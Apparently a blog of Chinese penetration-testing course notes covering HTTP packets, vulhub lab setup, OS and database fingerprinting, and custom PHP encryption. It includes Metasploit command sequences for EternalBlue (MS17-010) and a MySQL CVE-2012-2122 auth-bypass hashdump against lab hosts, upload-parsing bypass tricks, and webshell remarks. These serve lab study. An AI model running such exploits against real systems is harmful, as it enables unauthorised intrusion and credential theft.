<h3 id="day02-基础入门-数据包拓展"><a href="#day02-基础入门-数据包拓展" class="headerlink" title="day02-基础入门 数据包拓展"></a>day02-基础入门 数据包拓展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">2.1	https与http</span><br><span class="line">	HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。</span><br><span class="line">	HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。</span><br><span class="line">	HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题</span><br><span class="line">	HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</span><br><span class="line">2.2 Request 请求数据包数据格式</span><br><span class="line">	请求行	由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分开</span><br><span class="line">		HTTP 规划定义了 8 种可能的请求方法：</span><br><span class="line">            GET：检索 URL 中标识资源的一个简单请求</span><br><span class="line">            HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">            POST：服务器接受被写入客户端输出流中的数据的请求</span><br><span class="line">            PUT：服务器保存请求数据作为指定URL新内容的请求</span><br><span class="line">            DELETE：服务器删除 URL 中命令的资源的请求</span><br><span class="line">            OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">            TRACE：web 服务器反馈 Http 请求和其头标的请求</span><br><span class="line">            CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br><span class="line">	请求头	由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识</span><br><span class="line">		HOST: 主机或域名地址</span><br><span class="line">        Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。</span><br><span class="line">        User-Agent：是客户浏览器名称</span><br><span class="line">        Host：对应网址URL中的Web名称和端口号。</span><br><span class="line">        Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。</span><br><span class="line">        connection：用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接</span><br><span class="line">        Cookie：浏览器用这个属性向服务器发送Cookie，Cookie是在浏览器中寄存的小型数据体，它可以记载</span><br><span class="line">        和服务器相关的用户信息，也可以用来实现会话功能。</span><br><span class="line">        Referer：表明产生请求的网页URL。如比从网页/icconcept/index.jsp中点击一个链接到网页/icwork/search，在向服务器发送的GET/icwork/search中的请求中，Referer是http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪Web请求是从什么网站来的。</span><br><span class="line">        Content-Type：用来表名request的内容类型。可以用HttpServletRequest的getContentType()方法取得。</span><br><span class="line">        Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.</span><br><span class="line">        Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</span><br><span class="line">	空行</span><br><span class="line">		最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</span><br><span class="line">	请求数据</span><br><span class="line">		使用POST传送，最常使用的是Content-Type和Content-Length头标。</span><br><span class="line">2.3	Response 返回数据包数据格式</span><br><span class="line">	一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</span><br><span class="line">    	1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</span><br><span class="line">    	2.响应头标：包含服务器类型、日期、长度、内容类型等</span><br><span class="line">    	3.空行：响应头与响应体之间用空行隔开</span><br><span class="line">    	4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</span><br><span class="line">    HTTP响应码，参考https://blog.csdn.net/ChineseSoftware/article/details/123177081</span><br><span class="line">    	1xx：信息，请求收到，继续处理</span><br><span class="line">        2xx：成功，行为被成功地接受、理解和采纳</span><br><span class="line">        	200 存在文件</span><br><span class="line">        3xx：重定向，为了完成请求，必须进一步执行的动作</span><br><span class="line">        	3xx	均可能存在</span><br><span class="line">        4xx：客户端错误</span><br><span class="line">        	403 存在文件夹</span><br><span class="line">        	404 不存在文件及文件夹</span><br><span class="line">        5xx：服务器错</span><br><span class="line">        	500 均可能存在</span><br><span class="line">	资源</span><br><span class="line">		https://www.mozhe.cn/</span><br><span class="line">		https://www.mozhe.cn/bug/N2dmMnp1b1VYd2EzLzBNR3MvRVlIZz09bW96aGUmozhe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip.chinaz.com站长工具显示的浏览器标识可以通过bp抓包改UA搞成XSS的样子</span><br><span class="line">有一个思路是使用手机和电脑分别去抓包比较请求包的不同</span><br></pre></td></tr></table></figure>

<h3 id="day03-基础入门-搭建安全扩展"><a href="#day03-基础入门-搭建安全扩展" class="headerlink" title="day03-基础入门 搭建安全扩展"></a>day03-基础入门 搭建安全扩展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">	域名扫描只能扫描出来域名文件，而域名文件只是占服务器资源的一小部分；IP扫描可以直接扫描出来服务器的根目录，得到的信息更多；</span><br><span class="line">	iis服务器（win2003演示）</span><br><span class="line">		在配置中有一个设置后缀格式使用asp.dll解析的，可以上传别的不是.asp的文件去使用一巨话木马连接</span><br><span class="line">		身份验证有一个启用匿名访问会对访问ip进行限制</span><br><span class="line">		ip地址和域名限制可以限制指定用户登录</span><br><span class="line">3.1 网站搭建环境</span><br><span class="line">	ASP,PHP,ASPX,JSP,PY,JAVAWEB 等环境</span><br><span class="line">	源码中的敏感文件</span><br><span class="line">		后台路径，数据库配置文件，备份文件等</span><br><span class="line">3.2 基于中间件的简要识别</span><br><span class="line">	返回数据包 server</span><br><span class="line">3.3 后门注意事项</span><br><span class="line">	后门是否给予执行权限</span><br><span class="line">    后门是否给予操作目录或文件权限</span><br><span class="line">    后门是否给予其他用户权限 </span><br><span class="line">https://vulhub.org/#/environments/</span><br></pre></td></tr></table></figure>

<h4 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">按照顺序做</span><br><span class="line">https://vulhub.org/#/docs/download-vulhub/</span><br><span class="line">先安装docker			#安装在云服务器失败了可能是docker安装版本的问题</span><br><span class="line">    curl -s https://get.docker.com/ | sh</span><br><span class="line">安装docker-compose，这一步有点问题，要使用pip3安装docker-compose，centos内置python2.7，所以要装python3，且要装pip3且要upgrade pip3版本</span><br><span class="line">	https://blog.csdn.net/qq_32742573/article/details/119849634</span><br><span class="line">	yum install python3-pip</span><br><span class="line">	pip3 install --upgrade pip</span><br><span class="line">	pip3 install docker-compose</span><br><span class="line">下载vulhub，这里先升级git</span><br><span class="line">	https://blog.csdn.net/bin9wei/article/details/121299033</span><br><span class="line">	git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">之后参照漏洞环境部分，此处git碰到点问题可能是代理的问题莫名其妙好了</span><br><span class="line"></span><br><span class="line">	参考https://vulhub.org/#/environments/httpd/CVE-2017-15715/</span><br><span class="line">	systemctl enable docker</span><br><span class="line">	首先cd目录</span><br><span class="line">		cd flask/ssti</span><br><span class="line">	编译</span><br><span class="line">		docker-compose up -d</span><br><span class="line">			（如果编译过，docker-compose build）</span><br><span class="line">	移除</span><br><span class="line">		docker-compose down</span><br><span class="line">	</span><br><span class="line">	e.g.1 CVE-2017-15715，这是个文件上传解析漏洞上传1.php\x0A可绕过一些服务器的安全策略</span><br><span class="line">	e.g.2 Apache HTTPD多后缀解析漏洞这个也是.php.jpeg当作php文件执行了</span><br><span class="line">		值得一提的是，这个靶场是搭建在80端口，和我本地phpstudy搭建的apache重叠了，解决方法是从小皮面板进去关掉apache</span><br><span class="line">		lsof -i:80</span><br><span class="line">		不使用面板,sh start开sh stop关/usr/local/phpstudy/soft/apache/httpd-2.4.46,如下图所示</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1665762508224.png" alt="1665762508224"></p>
<h3 id="day04-基础入门-WEB源码拓展"><a href="#day04-基础入门-WEB源码拓展" class="headerlink" title="day04-基础入门 WEB源码拓展"></a>day04-基础入门 WEB源码拓展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">敏感目录结构：</span><br><span class="line">	数据库配置文件，后台目录，模版目录，数据库目录等</span><br><span class="line">web脚本类型：</span><br><span class="line">	ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码</span><br><span class="line">应用分类：</span><br><span class="line">	社交，论坛(XSS、逻辑漏洞)，门户(综合类漏洞)，第三方(根据功能)，博客(漏洞较少),门户(综合),电商(业务逻辑)等不同的代码机制对应漏洞</span><br><span class="line">开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</span><br><span class="line">关于源码获取的相关途径：</span><br><span class="line">	百度搜索，咸鱼淘宝，第三方源码站</span><br><span class="line">总结</span><br><span class="line">	关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取</span><br><span class="line">程序源码获取途径</span><br><span class="line">	大众型的，知名的网上直接搜（thinkphp，币圈）</span><br><span class="line">	小众型的，正规的有正规渠道，非法的有非法的渠道</span><br><span class="line">	获取之后可以代码审计，脚本类型（asp，php，aspx，jsp），cms（分大众型小众型）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">此处举例BEES_4.0_R_20160525的CMS源码</span><br><span class="line">	admin后台操作后台路径</span><br><span class="line">	article文章</span><br><span class="line">	data数据相关</span><br><span class="line">		config.php数据库配置信息</span><br><span class="line">	member会员的</span><br><span class="line">	template模板</span><br><span class="line">关于语言的漏洞	这是一个笔记文件https://websec.readthedocs.io/zh/latest/language/php/index.html</span><br><span class="line">CMS漏洞举例</span><br><span class="line">	http://xiaodi8.com/?id=182</span><br><span class="line">		emm这个小迪举例翻车</span><br><span class="line">	CMS识别网站</span><br><span class="line">		whatweb.bugscaner.com/look</span><br><span class="line">	此处举例了一个币圈的cms,可以通过网页加载的一个文件使用google去搜获取cms信息</span><br></pre></td></tr></table></figure>



<h3 id="day05-基础入门-系统及数据库"><a href="#day05-基础入门-系统及数据库" class="headerlink" title="day05-基础入门 系统及数据库"></a>day05-基础入门 系统及数据库</h3><p> <img src="C:\Users\hyy\Desktop\小迪2020.assets\640-1688030928583.png" alt="图片"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">5.1 操作系统层面</span><br><span class="line">    识别操作系统常见方法</span><br><span class="line">        1.字母大小写 windows不敏感 linux敏感</span><br><span class="line">            windows:http://localhost/LEarninGPHP/index.PHP</span><br><span class="line">        2.ping值 </span><br><span class="line">        	ttl=128-》linux </span><br><span class="line">        	ttl=64或255-》windows</span><br><span class="line">        	ttl 32-&gt;windows98</span><br><span class="line">        	ttl 255-&gt;unix</span><br><span class="line">        3.nmap -O ip</span><br><span class="line">            linux yum安装</span><br><span class="line">            windows 官网exe安装 文件夹里面有一个nmap.exe</span><br><span class="line">            	nmap.exe -O 1.117.139.173</span><br><span class="line">            namp -O ip#-O是操作系统</span><br><span class="line">    简要两者区别及识别意义情况</span><br><span class="line">        可以帮助我们明确思路</span><br><span class="line">        可以筛选掉不符合系统的情况</span><br><span class="line">    操作系统层面漏洞类型对应意义</span><br><span class="line">        覆盖面广</span><br><span class="line">        获取的权限高</span><br><span class="line">        危害性大</span><br><span class="line">5.2 数据库层面</span><br><span class="line">	识别数据库类型常见方法</span><br><span class="line">        nmap -O ip</span><br><span class="line">        nmap ip -p 端口，通过端口开放反推数据库</span><br><span class="line">    数据库类型区别及识别意义</span><br><span class="line">        数据库的漏洞和类型相性很强</span><br><span class="line">        不同数据库漏洞爆发点不太一样</span><br><span class="line">        能确定数据库类型、版本，会对渗透有很大帮助</span><br><span class="line">	数据库常见漏洞类型及攻击</span><br><span class="line">        弱口令</span><br><span class="line">        sql注入</span><br><span class="line">	简要数据库层面漏洞影响范围 </span><br><span class="line">        要参考数据库的重要程来判定影响范围</span><br><span class="line">    常见的数据库结构</span><br><span class="line">        ASP+Access或者sqlserver(1433)</span><br><span class="line">        php+mysql 		3306</span><br><span class="line">        axpx+mssql</span><br><span class="line">        jsp+mssql，oracle(1521) </span><br><span class="line">        python+mongodb(27017)</span><br><span class="line">    服务器端口</span><br><span class="line">        关系型数据库 --MySQL:3306 --SqlServer:1433 --Oracle:1521</span><br><span class="line">        NOSQL数据库 --MongoDB:27017 --Redis:6379 --memcached:11211</span><br><span class="line">	第三方</span><br><span class="line">        如何判断那些有第三方平台或软件 -- 端口扫描 -- 特征匹配</span><br><span class="line">        简要为什么要识别第三方平台或软件 -- 可以提供额外的攻击面</span><br><span class="line">        常见第三方平台或软件漏洞类型及攻击 -- 弱口令</span><br><span class="line">        简要第三方平台或软件安全测试的范围</span><br><span class="line">    除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务( 邮件，游戏，负载均衡等)，也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的!</span><br><span class="line">    资源</span><br><span class="line">        https://nmap.org/</span><br><span class="line">        https://www.kali.org/downloads/ </span><br><span class="line">        https://github.com/hellogoldsnakeman/masnmapscan-V1.0端口扫描工具，速度快但是功能没有nmap好</span><br><span class="line">        https://pypi.tuna.tsinghua.edu.cn/simple-------清华大学python镜像 </span><br><span class="line">        https://pypi.tuna.tsinghua.edu.cn-------清华大学python镜像</span><br><span class="line">        https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</span><br></pre></td></tr></table></figure>

<h4 id="Windows-Server-2008-R2-x64操作系统层面"><a href="#Windows-Server-2008-R2-x64操作系统层面" class="headerlink" title="Windows Server 2008 R2 x64	操作系统层面"></a>Windows Server 2008 R2 x64	操作系统层面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 x64</span><br><span class="line"></span><br><span class="line">cmd-&gt;msfconsole</span><br><span class="line">search ms17_010</span><br><span class="line">use windows/smb/ms17_010_eternablue</span><br><span class="line">show options</span><br><span class="line">set rhost 192.168.213.129			#win server</span><br><span class="line">set lhost 192.168.213.130			#kali</span><br><span class="line">run</span><br><span class="line">shell</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<h4 id="mysql身份认证绕过漏洞-数据库弱口令"><a href="#mysql身份认证绕过漏洞-数据库弱口令" class="headerlink" title="mysql身份认证绕过漏洞  数据库弱口令"></a>mysql身份认证绕过漏洞  数据库弱口令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">这个任务复现失败了。。连不上192.168.213.135:3306,phpMyAdmin也不上</span><br><span class="line">	https://vulhub.org/#/environments/mysql/CVE-2012-2122/</span><br><span class="line">然后重装了centos_vulhub，攻击了但是没攻击成功</span><br><span class="line"></span><br><span class="line">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</span><br><span class="line">开启靶场</span><br><span class="line">systemctl docker start#先打开dokcer</span><br><span class="line">cd /root/vulhub/mysql/CVE-2012-2122</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">本地装过musql5.7.27-log 80端口重复打不开</span><br><span class="line">开始攻击</span><br><span class="line">nmap -sV -O 192.168.213.135得知mysql版本5.5.23对照受影响版本</span><br><span class="line">cmd-》msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.213.135</span><br><span class="line">set threads 10</span><br><span class="line">run或者exploit   #攻击</span><br><span class="line"></span><br><span class="line">关闭环境</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

<h4 id="第三方phpmyadmin反序列化-第三方应用安全漏洞"><a href="#第三方phpmyadmin反序列化-第三方应用安全漏洞" class="headerlink" title="第三方phpmyadmin反序列化 第三方应用安全漏洞"></a>第三方phpmyadmin反序列化 第三方应用安全漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参考https://vulhub.org/#/environments/phpmyadmin/WooYun-2016-199433/</span><br><span class="line">打开环境</span><br><span class="line">cd /root/vulhub/phpmyadmin/WooYun-2016-199433</span><br><span class="line">docker-compose build		#编译</span><br><span class="line">docker-compose up -d		#启动</span><br><span class="line"></span><br><span class="line">利用是抓包更具exploit改,涉及反序列化</span><br></pre></td></tr></table></figure>

<h3 id="day06-加密算法"><a href="#day06-加密算法" class="headerlink" title="day06 加密算法"></a>day06 加密算法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">6.1 常见加密编码等算法解析</span><br><span class="line">	MD5，SHA，ASCII，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</span><br><span class="line">		hash(不可逆，解密时枚举，彩虹表) md5分为md5(32位)和16位MD5</span><br><span class="line">		ascii 8位</span><br><span class="line">		16进制文本</span><br><span class="line">		时间戳e.g. 20220709 1657296000</span><br><span class="line">		url</span><br><span class="line">		base64			一个等号</span><br><span class="line">6.2 常见加密形式算法解析</span><br><span class="line">	直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</span><br><span class="line">6.3 常见解密方式</span><br><span class="line">	枚举，自定义逆向算法，可逆向</span><br><span class="line">6.4 了解常规加密算法的特性</span><br><span class="line">	长度位数，字符规律，代码分析，搜索获取等</span><br><span class="line">6.5 工具</span><br><span class="line">	链接：https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ 提取码：8eh7 </span><br><span class="line">	http://tool.chacuo.net/cryptaes</span><br><span class="line">资源</span><br><span class="line">    https://www.mozhe.cn</span><br><span class="line">    https://www.cmd5.com</span><br><span class="line">    http://tool.chacuo.net/cryptaes	</span><br><span class="line">    https://ctf.bugku.com/challenges</span><br></pre></td></tr></table></figure>

<h4 id="自定义加密算法及解密"><a href="#自定义加密算法及解密" class="headerlink" title="自定义加密算法及解密"></a>自定义加密算法及解密</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="comment">#print $key;</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span> (<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">#print $len;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span> ;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">        <span class="comment">#print $key[$X];</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print $char[0].$char[1].$char[2];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span> ((<span class="title function_ invoke__">ord</span> (<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span> (<span class="variable">$char</span>[<span class="variable">$i</span>]))%<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span> (<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="string">&#x27;helloword&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$mkey</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$str</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$tmp</span>);         <span class="comment">//解密base64</span></span><br><span class="line">    <span class="variable">$md_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$tmp</span>);            <span class="comment">//获取输入加密字符长度</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$char</span> = <span class="string">&quot;&quot;</span>;                         <span class="comment">//临时数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)&#123;               <span class="comment">//当加密字符串长度超出key</span></span><br><span class="line">             <span class="variable">$x</span> = <span class="number">0</span>;                    <span class="comment">//的长度时查重头开始和获取    </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$mkey</span>[<span class="variable">$x</span>];             <span class="comment">//.= 累积函数</span></span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span 